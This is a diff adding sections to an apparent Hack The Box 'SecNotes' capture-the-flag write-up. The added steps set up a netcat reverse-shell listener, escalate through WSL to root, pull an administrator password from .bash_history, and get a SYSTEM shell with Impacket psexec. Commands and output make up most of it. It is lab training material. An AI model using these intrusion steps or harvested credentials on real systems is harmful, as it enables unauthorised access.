@@ -183,6 +183,8 @@ smb: \> ls
 
 Now we need to start a listener on port 6666 and visit the `rev.php` resource.
 
+## User Enumeration
+
 ```bash
 $ nc -lnvp 6666
 listening on [any] 6666 ...
@@ -215,13 +217,148 @@ SERVICE_NAME: windefend
         WAIT_HINT          : 0x0
 ```
 
-Cant do the rest, the box keeps crashing.
+### WSL
+
+Once we move to tyler's desktop, we see there are fe `.lnk` files available. More specifically, bash seems to be available in windows. This suggests that there might be `WSL` running on this machine.
 
 ```PowerShell
-:\inetpub\new-site>where /R c:\windows bash.exe
-where /R c:\windows bash.exe
-c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+C:\inetpub\new-site>cd ../../Users/tyler/Desktop
+
+C:\Users\tyler\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:\Users\tyler\Desktop
+
+08/19/2018  03:51 PM    <DIR>          .
+08/19/2018  03:51 PM    <DIR>          ..
+06/22/2018  03:09 AM             1,293 bash.lnk
+08/02/2021  03:32 AM             1,210 Command Prompt.lnk
+04/11/2018  04:34 PM               407 File Explorer.lnk
+06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
+06/21/2018  09:17 AM             1,110 Notepad++.lnk
+07/11/2025  06:11 PM                34 user.txt
+08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
+               7 File(s)          7,965 bytes
+               2 Dir(s)  13,913,698,304 bytes free
+
+C:\Users\tyler\Desktop>type bash.lnk
+L�F w������V�   �v(���  ��9P�O� �:i�+00�/C:\V1�LIWindows@       ﾋL���LI.h���&WindowsZ1�L<System32B      ﾋL���L<.p�k�System32▒Z2��LP� bash.exeB  ﾋL<��LU.�Y����bash.exe▒K-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
+                                                                                                     �wN�▒�]N�D.��Q���`�Xsecnotesx�<sAA��㍧�o�:u��'�/�x�<sAA��㍧�o�:u��'�/�=        �Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS��XF�L8C���&�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����%
+        bash.exe@������
+                       �)
+                         Application@v(���      �i1SPS�jc(=�����O�▒�MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
 ```
 
+We can search for the `bash.exe` on the file system and use it to gain access to the `WSL` system.
 
-SecNotes
+```PowerShell
+C:\Users\tyler\Desktop>where /R c:\windows bash.exe
+where /R c:\windows bash.exe
+c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+
+C:\Users\tyler\Desktop>where /R c:\windows wsl     
+where /R c:\windows wsl
+c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
+
+C:\Users\tyler\Desktop>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
+c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
+mesg: ttyname failed: Inappropriate ioctl for device
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### .bash_history
+Even though we are the `root` user on WSL, we still do not have administrator acess on the box.
+
+```bash
+cd /mnt/c
+
+ls
+$Recycle.Bin
+BOOTNXT
+Config.Msi
+Distros
+Documents and Settings
+Microsoft
+PerfLogs
+Program Files
+Program Files (x86)
+ProgramData
+Recovery
+System Volume Information
+Ubuntu.zip
+Users
+Windows
+bootmgr
+inetpub
+pagefile.sys
+php7
+swapfile.sys
+
+cd Users/Administrator
+ls
+ls: cannot open directory '.': Permission denied
+```
+
+We can begin enumeration by checking the `.bash_history` of this user.
+
+```bash
+cd ~
+ls -la
+total 8
+drwx------ 1 root root  512 Jun 22  2018 .
+drwxr-xr-x 1 root root  512 Jun 21  2018 ..
+---------- 1 root root  398 Jun 22  2018 .bash_history
+-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
+
+cat .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+> .bash_history 
+less .bash_history
+exit
+```
+
+Within the history, we see there is a command that was run by this user with the administrator password. We can use this with `psexec` to gain access to the machine as an Administrator.
+
+## PWNED
+
+```bash
+$ python psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.97.....
+[*] Found writable share ADMIN$
+[*] Uploading file CMsJsWyC.exe
+[*] Opening SVCManager on 10.10.10.97.....
+[*] Creating service YimE on 10.10.10.97.....
+[*] Starting service YimE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+i(c) 2018 Microsoft Corporation. All rights reserved.
+ 
+C:\WINDOWS\system32> whoami
+nt authority\system
+```
+
+We have successfully pawned the machine!
